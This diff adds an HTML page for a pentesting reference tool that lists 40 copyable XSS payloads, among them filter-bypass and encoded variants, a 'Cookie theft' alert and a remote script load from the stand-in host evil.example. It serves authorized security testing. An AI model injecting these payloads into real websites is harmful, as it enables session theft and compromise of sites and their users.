@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XSS Payload Generator — ghosttools</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg0: #0d1117;
+      --bg1: #161b22;
+      --bg2: #21262d;
+      --border: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --accent: #f85149;
+    }
+
+    body {
+      background: var(--bg0);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      font-size: 14px;
+    }
+
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg0); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: rgba(248,81,73,.4); }
+    ::selection { background: rgba(248,81,73,.2); }
+
+    /* ── TOP BAR ── */
+    .topbar {
+      background: var(--bg1);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .back {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      transition: color .2s;
+      flex-shrink: 0;
+    }
+    .back:hover { color: var(--accent); }
+    .topbar .logo { font-size: 18px; font-weight: 700; }
+    .topbar .logo span { color: var(--accent); }
+    .topbar .badge {
+      background: rgba(248,81,73,.12);
+      border: 1px solid rgba(248,81,73,.3);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 9px;
+      border-radius: 20px;
+    }
+    .topbar .desc {
+      font-size: 12px;
+      color: var(--muted);
+      margin-left: 4px;
+    }
+    .topbar .tags { margin-left: auto; display: flex; gap: 6px; flex-wrap: wrap; }
+    .tag {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 4px;
+    }
+
+    /* ── MAIN ── */
+    .main {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 32px 24px 64px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* ── WARNING BANNER ── */
+    .warning-banner {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(248,81,73,.07);
+      border: 1px solid rgba(248,81,73,.25);
+      color: #ff7b72;
+      font-size: 12px;
+      padding: 10px 14px;
+      border-radius: 7px;
+      line-height: 1.5;
+    }
+    .warning-banner svg { flex-shrink: 0; color: var(--accent); }
+    .warning-banner strong { color: var(--accent); }
+
+    /* ── TOOLBAR ── */
+    .toolbar {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .search-wrap {
+      position: relative;
+      flex: 1;
+      min-width: 200px;
+    }
+    .search-wrap svg {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--muted);
+      pointer-events: none;
+    }
+    .search-input {
+      width: 100%;
+      background: var(--bg1);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: inherit;
+      font-size: 13px;
+      padding: 8px 12px 8px 34px;
+      border-radius: 7px;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .search-input:focus { border-color: var(--accent); }
+    .search-input::placeholder { color: var(--muted); opacity: .6; }
+
+    .payload-count {
+      font-size: 12px;
+      color: var(--muted);
+      white-space: nowrap;
+    }
+    .payload-count strong { color: var(--text); }
+
+    /* ── CATEGORY TABS ── */
+    .cat-tabs {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+    .cat-btn {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-family: inherit;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: background .15s, border-color .15s, color .15s;
+      white-space: nowrap;
+    }
+    .cat-btn:hover {
+      border-color: var(--accent);
+      color: var(--text);
+    }
+    .cat-btn.active {
+      background: rgba(248,81,73,.15);
+      border-color: var(--accent);
+      color: var(--accent);
+    }
+
+    /* ── PAYLOAD LIST ── */
+    .payload-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .no-results {
+      text-align: center;
+      padding: 48px 0;
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .no-results svg { display: block; margin: 0 auto 12px; opacity: .35; }
+
+    /* ── PAYLOAD CARD ── */
+    .payload-card {
+      background: var(--bg1);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      transition: border-color .2s;
+    }
+    .payload-card:hover { border-color: rgba(248,81,73,.35); }
+
+    .card-top {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .card-meta {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .cat-badge {
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      padding: 2px 7px;
+      border-radius: 4px;
+      background: rgba(248,81,73,.12);
+      border: 1px solid rgba(248,81,73,.28);
+      color: var(--accent);
+      white-space: nowrap;
+    }
+    .cat-badge.basic    { background: rgba(88,166,255,.1);  border-color: rgba(88,166,255,.3);  color: #58a6ff; }
+    .cat-badge.event    { background: rgba(63,185,80,.1);   border-color: rgba(63,185,80,.3);   color: #3fb950; }
+    .cat-badge.svg      { background: rgba(210,168,255,.1); border-color: rgba(210,168,255,.3); color: #d2a8ff; }
+    .cat-badge.bypass   { background: rgba(255,123,114,.1); border-color: rgba(255,123,114,.3); color: #ff7b72; }
+    .cat-badge.dom      { background: rgba(227,179,65,.1);  border-color: rgba(227,179,65,.3);  color: #e3b341; }
+    .cat-badge.encoded  { background: rgba(248,81,73,.1);   border-color: rgba(248,81,73,.28);  color: var(--accent); }
+
+    .card-desc {
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.4;
+    }
+
+    .copy-btn {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-family: inherit;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background .15s, border-color .15s, color .15s;
+      white-space: nowrap;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .copy-btn:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+    }
+    .copy-btn.copied {
+      background: rgba(63,185,80,.12);
+      border-color: rgba(63,185,80,.4);
+      color: #3fb950;
+    }
+
+    .payload-pre {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace;
+      font-size: 12px;
+      color: #adbac7;
+      line-height: 1.6;
+      overflow-x: auto;
+      white-space: pre;
+      word-break: normal;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 16px 24px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+    }
+    footer span { color: var(--accent); }
+  </style>
+</head>
+<body>
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <a href="../index.html" class="back">← ~/tools</a>
+    <div class="logo">XSS<span>Payloads</span></div>
+    <span class="badge">v1.0</span>
+    <span class="desc">curated XSS payload reference for authorized testing</span>
+    <div class="tags">
+      <span class="tag">xss</span>
+      <span class="tag">web-security</span>
+      <span class="tag">pentesting</span>
+      <span class="tag">payloads</span>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+
+    <!-- WARNING -->
+    <div class="warning-banner">
+      <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+      <span><strong>For authorized testing only.</strong> Never use against systems you don't own.</span>
+    </div>
+
+    <!-- TOOLBAR -->
+    <div class="toolbar">
+      <div class="search-wrap">
+        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+        </svg>
+        <input
+          type="text"
+          class="search-input"
+          id="searchInput"
+          placeholder="Filter payloads…"
+          autocomplete="off"
+          spellcheck="false"
+        />
+      </div>
+      <div class="payload-count" id="payloadCount"><strong>40</strong> payloads</div>
+    </div>
+
+    <!-- CATEGORY TABS -->
+    <div class="cat-tabs" id="catTabs">
+      <button class="cat-btn active" data-cat="all">All</button>
+      <button class="cat-btn" data-cat="basic">Basic</button>
+      <button class="cat-btn" data-cat="event">Event Handlers</button>
+      <button class="cat-btn" data-cat="svg">SVG / HTML5</button>
+      <button class="cat-btn" data-cat="bypass">Filter Bypass</button>
+      <button class="cat-btn" data-cat="dom">DOM-based</button>
+      <button class="cat-btn" data-cat="encoded">Encoded</button>
+    </div>
+
+    <!-- PAYLOAD LIST -->
+    <div class="payload-list" id="payloadList"></div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <footer>ghosttools · <span>client-side</span> · open-source</footer>
+
+  <script>
+    (function () {
+      'use strict';
+
+      /* ── PAYLOAD DATA ── */
+      var PAYLOADS = [
+        /* BASIC */
+        { cat: 'basic', label: 'Basic', desc: 'Basic script injection',           code: '<script>alert(1)<\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'Domain disclosure',                code: '<script>alert(document.domain)<\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'Cookie theft',                     code: '<script>alert(document.cookie)<\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'Attribute breakout',               code: '"><script>alert(1)<\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'Single quote breakout',            code: "\'><script>alert(1)<\/script>" },
+        { cat: 'basic', label: 'Basic', desc: 'Script tag injection',             code: '<\/script><script>alert(1)<\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'Remote script load',               code: '<script src="https://evil.example/x.js"><\/script>' },
+        { cat: 'basic', label: 'Basic', desc: 'JavaScript URL',                   code: 'javascript:alert(1)' },
+
+        /* EVENT HANDLERS */
+        { cat: 'event', label: 'Event Handlers', desc: 'img onerror',             code: '<img src=x onerror=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'body onload',             code: '<body onload=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'SVG onload',              code: '<svg onload=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'input autofocus',         code: '<input autofocus onfocus=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'select autofocus',        code: '<select autofocus onfocus=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'textarea autofocus',      code: '<textarea autofocus onfocus=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'video onerror',           code: '<video src=1 onerror=alert(1)>' },
+        { cat: 'event', label: 'Event Handlers', desc: 'details ontoggle',        code: '<details open ontoggle=alert(1)>' },
+
+        /* SVG / HTML5 */
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'SVG script',              code: '<svg><script>alert(1)<\/script><\/svg>' },
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'MathML',                  code: '<math><mtext><table><mglyph><style><!--<\/style><img title="--><\/table><img src=1 onerror=alert(1)">' },
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'SVG animate',             code: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' },
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'SVG set',                 code: '<svg><set onbegin=alert(1) attributeName=x>' },
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'SVG use href',            code: "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)<\/script><\/svg>#x\">" },
+        { cat: 'svg',   label: 'SVG / HTML5',    desc: 'SVG anchor',              code: '<svg><a href="javascript:alert(1)"><text y="20">click me<\/text><\/a><\/svg>' },
+
+        /* FILTER BYPASS */
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Case variation',          code: '<ScRiPt>alert(1)<\/ScRiPt>' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Space in tag',            code: '<script >alert(1)<\/script >' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Null byte',               code: '<scr\x00ipt>alert(1)<\/scr\x00ipt>' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Mixed case JS URL',       code: '<img src="jAvAsCrIpT:alert(1)">' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Double open',             code: '<<script>alert(1)//<<\/script>' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'Template literal',        code: '<script>alert`(1)`<\/script>' },
+        { cat: 'bypass', label: 'Filter Bypass', desc: 'In-attribute injection',  code: '"><img src=1 onerror=alert(1) x="' },
+
+        /* DOM-BASED */
+        { cat: 'dom',    label: 'DOM-based',     desc: 'Hash fragment',           code: '#<script>alert(1)<\/script>' },
+        { cat: 'dom',    label: 'DOM-based',     desc: 'JS void',                 code: 'javascript:void(document.domain=alert(document.domain))' },
+        { cat: 'dom',    label: 'DOM-based',     desc: 'Data URL',                code: 'data:text/html,<script>alert(1)<\/script>' },
+        { cat: 'dom',    label: 'DOM-based',     desc: 'iFrame JS',               code: '<iframe src="javascript:alert(1)">' },
+        { cat: 'dom',    label: 'DOM-based',     desc: 'Object data',             code: '<object data="javascript:alert(1)">' },
+
+        /* ENCODED */
+        { cat: 'encoded', label: 'Encoded',      desc: 'URL encoded',             code: '%3Cscript%3Ealert(1)%3C/script%3E' },
+        { cat: 'encoded', label: 'Encoded',      desc: 'HTML encoded',            code: '&lt;script&gt;alert(1)&lt;/script&gt;' },
+        { cat: 'encoded', label: 'Encoded',      desc: 'Unicode escaped',         code: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e' },
+        { cat: 'encoded', label: 'Encoded',      desc: 'HTML hex entities',       code: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;' },
+        { cat: 'encoded', label: 'Encoded',      desc: 'HTML decimal entities',   code: '&#60;script&#62;alert(1)&#60;/script&#62;' },
+        { cat: 'encoded', label: 'Encoded',      desc: 'Base64 eval',             code: "<script>eval(atob('YWxlcnQoMSk='))<\/script>" }
+      ];
+
+      /* ── STATE ── */
+      var activeCat   = 'all';
+      var searchQuery = '';
+
+      /* ── ELEMENTS ── */
+      var listEl    = document.getElementById('payloadList');
+      var countEl   = document.getElementById('payloadCount');
+      var searchEl  = document.getElementById('searchInput');
+
+      /* ── BADGE CLASS MAP ── */
+      var badgeClass = {
+        basic:   'basic',
+        event:   'event',
+        svg:     'svg',
+        bypass:  'bypass',
+        dom:     'dom',
+        encoded: 'encoded'
+      };
+
+      /* ── RENDER ── */
+      function render() {
+        var q = searchQuery.toLowerCase();
+
+        var filtered = PAYLOADS.filter(function (p) {
+          var catMatch = (activeCat === 'all') || (p.cat === activeCat);
+          var searchMatch = !q ||
+            p.code.toLowerCase().indexOf(q) !== -1 ||
+            p.desc.toLowerCase().indexOf(q) !== -1 ||
+            p.label.toLowerCase().indexOf(q) !== -1;
+          return catMatch && searchMatch;
+        });
+
+        /* Update count */
+        countEl.innerHTML = '<strong>' + filtered.length + '<\/strong> payload' + (filtered.length !== 1 ? 's' : '');
+
+        /* Clear list */
+        while (listEl.firstChild) listEl.removeChild(listEl.firstChild);
+
+        if (filtered.length === 0) {
+          var noRes = document.createElement('div');
+          noRes.className = 'no-results';
+          noRes.innerHTML =
+            '<svg width="32" height="32" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>' +
+            'No payloads match your search.';
+          listEl.appendChild(noRes);
+          return;
+        }
+
+        filtered.forEach(function (p) {
+          var card = document.createElement('div');
+          card.className = 'payload-card';
+
+          /* Top row */
+          var top = document.createElement('div');
+          top.className = 'card-top';
+
+          var meta = document.createElement('div');
+          meta.className = 'card-meta';
+
+          var badge = document.createElement('span');
+          badge.className = 'cat-badge ' + (badgeClass[p.cat] || '');
+          badge.textContent = p.label;
+
+          var desc = document.createElement('span');
+          desc.className = 'card-desc';
+          desc.textContent = p.desc;
+
+          meta.appendChild(badge);
+          meta.appendChild(desc);
+
+          /* Copy button */
+          var copyBtn = document.createElement('button');
+          copyBtn.className = 'copy-btn';
+          copyBtn.setAttribute('aria-label', 'Copy payload');
+          copyBtn.innerHTML =
+            '<svg width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">' +
+            '<rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>' +
+            '<path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>' +
+            '<\/svg> Copy';
+
+          (function (btn, code) {
+            btn.addEventListener('click', function () {
+              navigator.clipboard.writeText(code).then(function () {
+                btn.textContent = '✓ Copied!';
+                btn.classList.add('copied');
+                setTimeout(function () {
+                  btn.innerHTML =
+                    '<svg width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">' +
+                    '<rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>' +
+                    '<path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>' +
+                    '<\/svg> Copy';
+                  btn.classList.remove('copied');
+                }, 1800);
+              }).catch(function () {
+                /* Fallback */
+                var tmp = document.createElement('textarea');
+                tmp.value = code;
+                tmp.style.position = 'fixed';
+                tmp.style.opacity = '0';
+                document.body.appendChild(tmp);
+                tmp.select();
+                document.execCommand('copy');
+                document.body.removeChild(tmp);
+                btn.textContent = '✓ Copied!';
+                btn.classList.add('copied');
+                setTimeout(function () {
+                  btn.innerHTML =
+                    '<svg width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">' +
+                    '<rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>' +
+                    '<path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>' +
+                    '<\/svg> Copy';
+                  btn.classList.remove('copied');
+                }, 1800);
+              });
+            });
+          })(copyBtn, p.code);
+
+          top.appendChild(meta);
+          top.appendChild(copyBtn);
+
+          /* Code block — use textContent to prevent execution */
+          var pre = document.createElement('pre');
+          pre.className = 'payload-pre';
+          pre.textContent = p.code;   /* textContent — safe, no HTML parsing */
+
+          card.appendChild(top);
+          card.appendChild(pre);
+          listEl.appendChild(card);
+        });
+      }
+
+      /* ── CATEGORY TABS ── */
+      document.getElementById('catTabs').addEventListener('click', function (e) {
+        var btn = e.target.closest('.cat-btn');
+        if (!btn) return;
+        document.querySelectorAll('.cat-btn').forEach(function (b) { b.classList.remove('active'); });
+        btn.classList.add('active');
+        activeCat = btn.dataset.cat;
+        render();
+      });
+
+      /* ── SEARCH ── */
+      searchEl.addEventListener('input', function () {
+        searchQuery = searchEl.value;
+        render();
+      });
+
+      /* ── INIT ── */
+      render();
+
+    })();
+  </script>
+
+</body>
+</html>
